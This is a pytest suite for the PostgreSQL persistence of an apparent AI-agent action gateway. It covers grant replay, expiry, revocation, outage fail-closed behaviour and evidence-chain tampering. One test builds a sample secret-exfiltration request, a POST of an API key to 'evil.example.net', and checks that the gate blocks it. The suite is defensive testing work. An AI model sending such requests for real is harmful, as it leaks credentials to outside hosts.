"""PostgreSQL persistence: restart durability, replay / expiry / revocation across restarts and processes,
DB outage fails closed, a DB row alone never authorises, proof-mirror tampering is detected.

Runs against REAL PostgreSQL servers started for the test (pg_ctl/initdb). Skipped if PostgreSQL binaries are absent,
or uses QYRIX_TEST_DATABASE_URL if set (outage tests then skip)."""
import glob, json, os, shutil, signal, socket, subprocess, sys, tempfile, time, urllib.request, uuid
import pytest

import app.gateway as g
from app import adapter, persistence, provenance as prov

PG_BIN = next(iter(sorted(glob.glob("/usr/lib/postgresql/*/bin"), reverse=True)), None) or os.path.dirname(shutil.which("pg_ctl") or "")
HAVE_PG = bool(PG_BIN) and os.path.exists(os.path.join(PG_BIN, "pg_ctl"))
pytestmark = pytest.mark.skipif(not HAVE_PG and not os.getenv("QYRIX_TEST_DATABASE_URL"), reason="PostgreSQL not available")


def _free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close(); return p


class Cluster:
    """A throwaway PostgreSQL cluster (runs as the 'postgres' OS user when the tests run as root)."""
    def __init__(self):
        self.dir = tempfile.mkdtemp(prefix="qyrix-pg-")
        self.port = _free_port()
        self.as_user = ["runuser", "-u", "postgres", "--"] if os.geteuid() == 0 else []
        if self.as_user:
            shutil.chown(self.dir, "postgres")
        self._pg("initdb", "-D", self.dir + "/data", "-A", "trust", "-U", "qyrix")
        self.start()
        self.url = "postgresql://qyrix@127.0.0.1:%d/postgres" % self.port

    def _pg(self, tool, *args):
        subprocess.run(self.as_user + [os.path.join(PG_BIN, tool), *args], check=True, capture_output=True)

    def start(self):
        self._pg("pg_ctl", "-D", self.dir + "/data", "-w", "-o", "-p %d -k %s -c listen_addresses=127.0.0.1" % (self.port, self.dir), "-l", self.dir + "/log", "start")

    def stop(self):
        self._pg("pg_ctl", "-D", self.dir + "/data", "-w", "-m", "fast", "stop")

    def destroy(self):
        try:
            self.stop()
        except Exception:
            pass
        shutil.rmtree(self.dir, ignore_errors=True)


@pytest.fixture
def cluster():
    if os.getenv("QYRIX_TEST_DATABASE_URL"):
        pytest.skip("outage/restart tests need a disposable local cluster")
    c = Cluster()
    yield c
    c.destroy()


@pytest.fixture
def env(cluster, tmp_path):
    ws = tmp_path / "ws"; ws.mkdir(); (ws / "README.md").write_text("hello workspace")
    return {"url": cluster.url, "chain": str(tmp_path / "chain.jsonl"), "ws": str(ws), "cluster": cluster}


def boot(env):
    """A fresh 'process': new context, chain loaded from file, durable state loaded from PostgreSQL."""
    ctx = g.GateContext("t", prov.ProvenanceStore(), env["chain"], lambda: ("api.example.com",),
                        {"file.read": adapter.FileAdapter(env["ws"], g._redact)}, env["ws"])
    g._load_chain(ctx)
    try:
        g.attach_persistence(ctx, persistence.PgPersistence(env["url"]))
    except Exception:
        ctx.state["persistence"] = "down"
    return ctx


def A(**k):
    return g.Action(**k)


def run(ctx, gid_eid):
    return g.execute_grant({"gate_evaluation_id": gid_eid[1], "grant_id": gid_eid[0]}, ctx)


def refused(ctx, body):
    with pytest.raises(g.ExecRefused) as e:
        g.execute_grant(body, ctx)
    return e.value.code


def test_records_survive_restart_and_grant_executes_once(env):
    c1 = boot(env)
    assert c1.state["persistence"] == "postgres"
    u = c1.prov.add_step("skill", "UNTRUSTED", "x")
    t = c1.prov.add_step("ticket", "TRUSTED", "read readme")
    child = c1.prov.add_step("plan", "TRUSTED", "derived", [u["id"]])
    apr = g.create_approval(g.ApprovalReq(tool="http", method="DELETE", dest="https://api.example.com/v1/x"), c1)
    g.decide_approval(apr["id"], "approve", "admin", c1)
    r = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    assert r["verdict"] == "ALLOW" and r["grant_id"]
    blocked = g.evaluate(A(tool="http", method="POST", dest="https://evil.example.net/x", data="api_key=SYNTHETIC-NOT-A-KEY", lineage=[child["id"]]), c1)
    assert blocked["verdict"] == "BLOCK" and "R2_SECRET_EXFIL" in blocked["rules"]

    c2 = boot(env)                                                  # --- restart ---
    assert c2.state["persistence"] == "postgres" and not c2.state["degraded"]
    assert c2.prov.trust_of(child["id"]) == "UNTRUSTED" and c2.prov.get(t["id"])["label"] == "TRUSTED"
    assert c2.appr[apr["id"]]["status"] == "approved" and c2.appr[apr["id"]]["used"] is False
    assert r["gate_evaluation_id"] in c2.evals and r["grant_id"] in c2.grants
    assert c2.evals[blocked["gate_evaluation_id"]]["verdict"] == "BLOCK"
    assert g.proof.verify_records(c2.chain)["valid"]
    x = run(c2, (r["grant_id"], r["gate_evaluation_id"]))
    assert x["executed"] and x["result"]["bytes"] == 15
    assert refused(c2, {"gate_evaluation_id": r["gate_evaluation_id"], "grant_id": r["grant_id"]}) == "GRANT_REPLAY"

    c3 = boot(env)                                                  # --- restart again: still used ---
    assert c3.grants[r["grant_id"]]["used"] is True
    assert refused(c3, {"gate_evaluation_id": r["gate_evaluation_id"], "grant_id": r["grant_id"]}) == "GRANT_REPLAY"


def test_replay_across_two_processes_sharing_the_database(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    r = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    c2 = boot(env)                                                  # second process loads the same unused grant
    body = {"gate_evaluation_id": r["gate_evaluation_id"], "grant_id": r["grant_id"]}
    assert g.execute_grant(body, c1)["executed"]
    assert refused(c2, body) in ("GRANT_REPLAY", "PERSISTENCE_UNAVAILABLE")   # DB atomic consume stops the second process


def test_approval_consumed_once_across_processes(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "delete")
    apr = g.create_approval(g.ApprovalReq(tool="http", method="DELETE", dest="https://api.example.com/v1/x"), c1)
    g.decide_approval(apr["id"], "approve", "admin", c1)
    c2 = boot(env)
    act = dict(tool="http", method="DELETE", dest="https://api.example.com/v1/x", lineage=[t["id"]], approval_id=apr["id"])
    r1, r2 = g.evaluate(A(**act), c1), g.evaluate(A(**act), c2)
    assert [r1["verdict"], r2["verdict"]] == ["ALLOW", "BLOCK"]
    assert r2["rules"] == ["R6_APPROVAL_REPLAY"] and r2["grant_id"] is None
    # Supported deployment = ONE backend process per database/chain. A second, stale process sharing them cannot
    # double-consume (DB guard above) and, when its proof-mirror write collides, it fails closed for everything.
    if c2.state["persistence"] == "down":
        assert g.evaluate(A(tool="http", dest="https://api.example.com/v1/y", lineage=[t["id"]]), c2)["verdict"] == "BLOCK"


def test_expired_and_revoked_grants_cannot_execute_after_restart(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    e = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    v = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    assert g.revoke_grant(v["grant_id"], "admin", c1)["revoked"]
    assert refused(c1, {"gate_evaluation_id": v["gate_evaluation_id"], "grant_id": v["grant_id"]}) == "GRANT_REVOKED"
    c1.db._run(lambda cur: cur.execute("UPDATE grants SET expires_at = now() - interval '1 second' WHERE id=%s", (e["grant_id"],)))
    c2 = boot(env)
    assert refused(c2, {"gate_evaluation_id": e["gate_evaluation_id"], "grant_id": e["grant_id"]}) == "GRANT_EXPIRED"
    assert refused(c2, {"gate_evaluation_id": v["gate_evaluation_id"], "grant_id": v["grant_id"]}) == "GRANT_REVOKED"
    assert any(r["verdict"] == "GRANT_REVOKED" for r in c2.chain)  # revocation is in the evidence


def test_expired_in_db_but_not_in_memory_is_still_refused(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    e = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    c1.db._run(lambda cur: cur.execute("UPDATE grants SET expires_at = now() - interval '1 second' WHERE id=%s", (e["grant_id"],)))
    assert refused(c1, {"gate_evaluation_id": e["gate_evaluation_id"], "grant_id": e["grant_id"]}) == "GRANT_REPLAY"


def test_a_database_row_alone_never_authorises(env):
    c1 = boot(env)
    eid, gid = str(uuid.uuid4()), "grt_" + uuid.uuid4().hex
    params = {"tool": "file.read", "method": "GET", "dest": "README.md", "cmd": "", "data": ""}
    d = g.params_digest(params)
    c1.db.save_evaluation({"id": eid, "verdict": "ALLOW", "rules": [], "params": params, "digest": d, "hop": 0, "host": None, "ts": time.time()},
                          {"id": gid, "digest": d, "exp": time.time() + 600})   # forged rows: no ALLOW record in the chain
    c2 = boot(env)
    assert eid not in c2.evals and gid not in c2.grants
    assert refused(c2, {"gate_evaluation_id": eid, "grant_id": gid}) == "GRANT_INVALID"


def test_revalidation_blocks_execution_when_policy_changed(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    r = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    c1.workspace = None                                             # policy changed after the decision
    assert refused(c1, {"gate_evaluation_id": r["gate_evaluation_id"], "grant_id": r["grant_id"]}) == "REVALIDATION_FAILED"


def test_truncated_chain_file_vs_mirror_degrades_gate(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    for _ in range(3):
        g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    lines = open(env["chain"]).read().splitlines()
    open(env["chain"], "w").write("\n".join(lines[:-1]) + "\n")    # attacker deletes the last evidence record
    c2 = boot(env)
    assert c2.state["degraded"] is True and c2.state["persistence"] == "down"
    r = g.evaluate(A(tool="file.read", dest="README.md", lineage=[]), c2)
    assert r["verdict"] == "BLOCK" and "R11_PROOF_DEGRADED" in r["rules"]


def test_database_outage_fails_closed_and_recovers(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    pending = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    env["cluster"].stop()                                           # --- outage ---
    r = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    assert r["verdict"] == "BLOCK" and r["grant_id"] is None
    assert set(r["rules"]) & {"R17_PERSISTENCE_UNAVAILABLE", "R0_FAIL_CLOSED"}
    assert refused(c1, {"gate_evaluation_id": pending["gate_evaluation_id"], "grant_id": pending["grant_id"]}) == "PERSISTENCE_UNAVAILABLE"
    with pytest.raises(Exception):
        c1.prov.add_step("x", "TRUSTED", "y")
    with pytest.raises(g.ExecRefused):
        g.create_approval(g.ApprovalReq(dest="https://api.example.com/v1/y"), c1)
    assert g.proof.verify_records(c1.chain)["valid"]                # evidence stayed consistent during the outage
    env["cluster"].start()                                          # --- recovery ---
    c1.state["db_retry"] = 0
    r2 = g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    assert r2["verdict"] == "ALLOW" and c1.state["persistence"] == "postgres"
    assert g.execute_grant({"gate_evaluation_id": pending["gate_evaluation_id"], "grant_id": pending["grant_id"]}, c1)["executed"]
    assert len(c1.db.load_proof_index()) == len(c1.chain)           # mirror back-filled


def test_unreachable_database_at_startup_blocks_everything(tmp_path):
    env = {"url": "postgresql://qyrix@127.0.0.1:%d/postgres?connect_timeout=1" % _free_port(), "chain": str(tmp_path / "c.jsonl"), "ws": str(tmp_path)}
    c = boot(env)
    assert c.state["persistence"] == "down"
    r = g.evaluate(A(tool="file.read", dest="README.md", lineage=[]), c)
    assert r["verdict"] == "BLOCK" and "R17_PERSISTENCE_UNAVAILABLE" in r["rules"]


def test_placeholder_database_settings_are_refused(tmp_path, monkeypatch):
    with pytest.raises(persistence.PersistenceError):
        persistence.PgPersistence("")                               # no settings at all
    monkeypatch.delenv("QYRIX_DATABASE_URL", raising=False)
    monkeypatch.setenv("QYRIX_DB_HOST", "db")
    pw = tmp_path / "db_password"
    pw.write_text("CHANGE_ME_postgres_password\n")
    monkeypatch.setenv("QYRIX_DB_PASSWORD_FILE", str(pw))
    with pytest.raises(persistence.PersistenceError):
        persistence.dsn_from_env()                                  # placeholder secret file
    pw.write_text("")
    with pytest.raises(persistence.PersistenceError):
        persistence.dsn_from_env()                                  # empty secret file
    monkeypatch.setenv("QYRIX_DB_PASSWORD_FILE", str(tmp_path / "missing"))
    with pytest.raises(persistence.PersistenceError):
        persistence.dsn_from_env()                                  # missing secret file


def test_dsn_from_env_modes(tmp_path, monkeypatch):
    for k in ("QYRIX_DATABASE_URL", "QYRIX_DB_HOST", "QYRIX_DB_PASSWORD_FILE", "QYRIX_DB_PORT", "QYRIX_DB_NAME", "QYRIX_DB_USER"):
        monkeypatch.delenv(k, raising=False)
    assert persistence.dsn_from_env() is None                       # in-memory mode
    pw = tmp_path / "db_password"
    pw.write_text("generated-for-test with 'quote and space\n")
    monkeypatch.setenv("QYRIX_DB_HOST", "db"); monkeypatch.setenv("QYRIX_DB_PASSWORD_FILE", str(pw))
    from psycopg.conninfo import conninfo_to_dict
    d = conninfo_to_dict(persistence.dsn_from_env())
    assert d["host"] == "db" and d["dbname"] == "qyrix" and d["user"] == "qyrix" and d["port"] == "5432"
    assert d["password"] == "generated-for-test with 'quote and space"   # read from the file, escaped correctly
    monkeypatch.setenv("QYRIX_DATABASE_URL", "host=other dbname=x user=y")
    assert persistence.dsn_from_env() == "host=other dbname=x user=y"   # explicit URL wins
    monkeypatch.delenv("QYRIX_DB_PASSWORD_FILE"); monkeypatch.delenv("QYRIX_DATABASE_URL")
    assert persistence.DEFAULT_PASSWORD_FILE == "/run/secrets/db_password"   # Docker Compose secret mount


def test_connects_with_password_file_settings(cluster, tmp_path, monkeypatch):
    """Real PostgreSQL via the Docker-style settings (host/port/user + password file) instead of a URL."""
    pw = tmp_path / "db_password"; pw.write_text("generated-for-test\n")
    monkeypatch.delenv("QYRIX_DATABASE_URL", raising=False)
    for k, v in {"QYRIX_DB_HOST": "127.0.0.1", "QYRIX_DB_PORT": str(cluster.port), "QYRIX_DB_NAME": "postgres",
                 "QYRIX_DB_USER": "qyrix", "QYRIX_DB_PASSWORD_FILE": str(pw)}.items():
        monkeypatch.setenv(k, v)
    db = persistence.PgPersistence(persistence.dsn_from_env())
    assert db.ping() and "001_core_persistence.sql" in db.migrate()


def test_proof_mirror_and_anchors_are_append_only(env):
    c1 = boot(env)
    t = c1.prov.add_step("ticket", "TRUSTED", "read")
    g.evaluate(A(tool="file.read", dest="README.md", lineage=[t["id"]]), c1)
    with pytest.raises(persistence.PersistenceError):
        c1.db._run(lambda cur: cur.execute("UPDATE proof_records SET verdict='ALLOW'"))
    with pytest.raises(persistence.PersistenceError):
        c1.db._run(lambda cur: cur.execute("DELETE FROM proof_records"))


def test_real_backend_process_restart_over_http(env, tmp_path):
    """End to end: real uvicorn process + PostgreSQL, killed and restarted."""
    port = _free_port()
    e = {**os.environ, "QYRIX_DATABASE_URL": env["url"], "QYRIX_CHAIN_FILE": env["chain"], "QYRIX_WORKSPACE": env["ws"],
         "QYRIX_ADMIN_TOKEN": "admin-token-for-tests-0123456789", "QYRIX_AGENT_TOKEN": "agent-token-for-tests-0123456789"}
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    H = {"Authorization": "Bearer admin-token-for-tests-0123456789", "Content-Type": "application/json"}

    def start():
        p = subprocess.Popen([sys.executable, "-m", "uvicorn", "app.main:app", "--port", str(port)], cwd=here, env=e,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(100):
            try:
                urllib.request.urlopen("http://127.0.0.1:%d/api/v1/health" % port, timeout=1); return p
            except Exception:
                time.sleep(0.1)
        p.kill(); raise RuntimeError("backend did not start")

    def call(method, path, body=None):
        req = urllib.request.Request("http://127.0.0.1:%d/api/v1/%s" % (port, path), json.dumps(body).encode() if body is not None else None, H, method=method)
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as x:
            return x.code, json.loads(x.read())

    p = start()
    try:
        _, st = call("GET", "sentinel/status"); assert st["persistence"] == "postgres"
        _, s1 = call("POST", "sentinel/provenance/step", {"label": "TRUSTED", "text": "read readme"})
        _, a1 = call("POST", "sentinel/approvals", {"method": "DELETE", "dest": "https://api.render.com/v1/x"})
        _, gr = call("POST", "sentinel/gate/evaluate", {"tool": "file.read", "dest": "README.md", "lineage": [s1["id"]]})
        _, gr2 = call("POST", "sentinel/gate/evaluate", {"tool": "file.read", "dest": "README.md", "lineage": [s1["id"]]})
        assert call("POST", "sentinel/grants/%s/revoke" % gr2["grant_id"])[0] == 200
    finally:
        p.send_signal(signal.SIGKILL); p.wait()                     # hard kill: no graceful shutdown
    p = start()                                                     # --- restart ---
    try:
        _, st = call("GET", "sentinel/status"); assert st["persistence"] == "postgres" and st["proof"] == "available"
        _, pv = call("GET", "sentinel/provenance"); assert any(x["id"] == s1["id"] for x in pv["steps"])
        _, ap = call("GET", "sentinel/approvals"); assert any(x["id"] == a1["id"] for x in ap["approvals"])
        code, ex = call("POST", "tools/execute", {"gate_evaluation_id": gr["gate_evaluation_id"], "grant_id": gr["grant_id"]})
        assert code == 200 and ex["executed"] is True
        code, ex = call("POST", "tools/execute", {"gate_evaluation_id": gr["gate_evaluation_id"], "grant_id": gr["grant_id"]})
        assert code == 409 and ex["detail"] == "GRANT_REPLAY"
        code, ex = call("POST", "tools/execute", {"gate_evaluation_id": gr2["gate_evaluation_id"], "grant_id": gr2["grant_id"]})
        assert code == 409 and ex["detail"] == "GRANT_REVOKED"
    finally:
        p.send_signal(signal.SIGKILL); p.wait()
